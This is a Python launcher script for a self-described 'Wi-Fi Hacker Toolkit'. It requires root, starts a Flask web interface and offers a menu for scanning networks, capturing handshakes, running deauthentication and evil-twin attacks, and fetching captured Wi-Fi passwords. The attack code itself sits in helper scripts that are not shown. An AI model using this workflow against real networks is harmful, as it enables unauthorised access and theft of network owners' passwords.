import os
import subprocess
import time

def check_root():
    """Ensure the script is running as root."""
    if os.geteuid() != 0:
        print("[-] This script must be run as root!")
        exit(1)

def install_dependencies():
    """Run the system dependencies installer."""
    print("[*] Installing system dependencies...")
    subprocess.run(["python3", "install_dependencies.py"])

def setup_environment():
    """Run the virtual environment setup script."""
    print("[*] Setting up the Python environment...")
    subprocess.run(["python3", "setup_env.py"])

def start_web_interface():
    """Start the Flask web interface."""
    print("[*] Launching the Wi-Fi hacking web interface...")
    subprocess.Popen(["sudo", "python3", "webserver/app.py"])
    time.sleep(2)

def display_menu():
    """Display a CLI menu for controlling the system."""
    while True:
        print("\n🔥 Wi-Fi Hacker Toolkit 🔥")
        print("[1] Scan for Wi-Fi Networks")
        print("[2] Capture Handshake")
        print("[3] Start Deauth & Evil Twin Attack")
        print("[4] Get Captured Password")
        print("[5] Stop Attack")
        print("[6] Exit")
        choice = input("\nSelect an option: ")

        if choice == "1":
            print("[*] Opening web interface to scan networks...")
            os.system("xdg-open http://127.0.0.1")  # Open in browser
        elif choice == "2":
            ssid = input("[*] Enter SSID to capture handshake: ")
            subprocess.run(["python3", "scripts/capture.py", ssid])
        elif choice == "3":
            ssid = input("[*] Enter SSID for Evil Twin: ")
            bssid = input("[*] Enter BSSID of Target: ")
            gateway_mac = input("[*] Enter Gateway MAC: ")
            subprocess.run(["python3", "scripts/deauth.py", bssid, gateway_mac])
            subprocess.run(["python3", "scripts/evil_twin_validate.py", ssid])
        elif choice == "4":
            print("[*] Checking captured password...")
            subprocess.run(["python3", "webserver/app.py", "--get_password"])
        elif choice == "5":
            print("[*] Stopping all attacks...")
            subprocess.run(["python3", "webserver/app.py", "--stop_attack"])
        elif choice == "6":
            print("[*] Exiting...")
            exit(0)
        else:
            print("[-] Invalid option. Try again.")

if __name__ == "__main__":
    check_root()
    install_dependencies()
    setup_environment()
    start_web_interface()
    display_menu()
